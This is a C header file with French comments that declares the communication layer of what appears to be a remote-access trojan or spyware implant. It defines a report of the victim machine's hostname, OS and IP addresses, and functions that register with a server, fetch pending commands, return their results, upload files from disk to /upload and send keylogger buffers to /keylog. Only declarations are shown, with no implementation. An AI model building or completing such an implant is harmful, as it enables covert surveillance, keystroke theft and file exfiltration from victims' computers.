#ifndef COMMUNICATION_H
#define COMMUNICATION_H

typedef struct {
    const char *hostname;
    const char *os_info;
    const char *private_ip;
    const char *public_ip;
} MachineReport;

/* Envoie le rapport initial. Retourne l'ID machine assigné par le serveur (0 si erreur). */
int  send_report(const char *url, const MachineReport *report);

/* Lit la commande en attente sur le serveur. out_command est vidé si aucune commande. */
void get_command(int machine_id, char *out_command, size_t size);

/* Envoie le résultat d'une commande (JSON string). */
void post_result(int machine_id, const char *result_json);

/* Upload un fichier binaire depuis le disque vers /upload. */
void upload_file(int machine_id, const char *filepath, const char *filename);

/* Envoie du texte brut vers /keylog (buffer keylogger). */
void send_keylog(int machine_id, const char *data);

#endif /* COMMUNICATION_H */
